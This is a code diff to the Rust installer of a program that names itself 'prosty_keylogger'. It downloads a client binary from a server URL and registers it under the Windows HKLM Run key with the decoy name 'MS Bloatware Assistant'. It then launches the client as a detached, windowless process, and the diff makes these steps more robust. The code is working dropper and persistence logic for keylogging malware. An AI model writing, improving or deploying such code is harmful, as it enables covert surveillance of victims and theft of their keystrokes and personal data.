@@ -5,9 +5,10 @@ use std::path::{Path, PathBuf};
 use reqwest::Url;
 use std::env;
 use std::os::windows::process::CommandExt;
+use anyhow::Error;
 use clap::Parser;
 use iced::advanced::layout::atomic;
-use log::{error, info};
+use log::{debug, error, info};
 use prosty_keylogger::common::{InstallConfiguration, PathFragment, PersonalData, TaskConfiguration};
 use crate::options::Options;
 
@@ -29,8 +30,7 @@ fn download_and_save_client(url: &Url, dir: &Path, filename: &Path) -> Result<()
     })?;
     let path = dir.join(filename);
     println!("{:?}", &dir);
-    let d = fs::create_dir_all(&dir)?;
-    let mut file = std::fs::File::create(&path)?;
+    fs::create_dir_all(&dir)?;
     std::fs::write(path, content)?;
     Ok(())
 }
@@ -58,26 +58,41 @@ fn add_to_startup(file_path: &Path, server_address: &str, app_name: &str) -> Res
     //let exec_path = file_path.as_os_str().to_str().unwrap();
     //let mut arguments = String::with_capacity(80);
     //let arguments = format!("{}", server_address);
-    let output = std::process::Command::new("cmd")
+    let command = format!("{} {}", file_path.to_str().unwrap(), server_address);
+
+    match std::process::Command::new("cmd")
         .args(["/C", "REG", "ADD", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-            "/V", app_name, "/t", "REG_SZ", "/F", "/D", &format!("{:?} {}", file_path, server_address)])
-        .output()?;
+            "/V", app_name, "/t", "REG_SZ", "/F", "/D", &command])
+        .output(){
+        Ok(output) => {
+            debug!("Registering {output:?}")
+        }
+        Err(e) => {
+            info!("Process already registered: {e}")
+        }
+    }
     //info!()
-    println!("{:?}", output);
+    //println!("{:?}", output);
     Ok(())
 
 }
-fn spawn(file_path: &Path, server_address: &str, app_name: &str) -> Result<(), anyhow::Error>{
+fn spawn(file_path: &Path, server_address: &str) -> Result<(), anyhow::Error>{
     const DETACHED_PROCESS: u32 = 0x00000008;
     const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
     const CREATE_NO_WINDOW: u32 = 0x08000000;
+    let flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW;
 
-    let output = std::process::Command::new("cmd")
-        .args(["/C", &format!("{:?} {}", file_path, server_address)])
-        .creation_flags(DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW)
-        .output()?;
+    if let Err(e) =  std::process::Command::new(file_path.as_os_str())
+        .args([server_address])
+        .creation_flags(flags)
+        .spawn(){
 
-    println!("{:?}", output);
+        info!("Process is already running {e}")
+
+    }
+
+
+    //println!("{:?}", output);
     Ok(())
 }
 
@@ -92,12 +107,12 @@ fn install_client(url: &Url, install_configuration: &InstallConfiguration) -> Re
     //let dir = PathBuf::from_iter([&home_drive, &home_dir, "Documents/system/ptdd_x6"]);
     //let dir = PathFragment::join_slice(&task_configuration.installation_path)?;
 
-    println!("{:?}, {:?}, {:?}", &dir, &filename, &file_path);
+    //println!("{:?}, {:?}, {:?}", &dir, &filename, &file_path);
     //let path = PathBuf::from(install_configuration.);
     download_and_save_client(url, &dir, filename)?;
     //register_service(&file_path)?;
     add_to_startup(&file_path, &install_configuration.server_url, "MS Bloatware Assistant")?;
-    spawn(&file_path, &install_configuration.server_url, "MS Bloatware Assistant")?;
+    spawn(&file_path, &install_configuration.server_url)?;
 
 
 
@@ -133,7 +148,15 @@ fn main()-> Result<(), anyhow::Error> {
     })?;
 
 
-    install_client(&url, &config)?;
+    let install_result = install_client(&url, &config);
+    match install_result{
+        Ok(()) => {
+            info!("Installation finished");
+        }
+        Err(e) => {
+            error!("Error during installation: {e}");
+        }
+    }
     Ok(())
 
 }
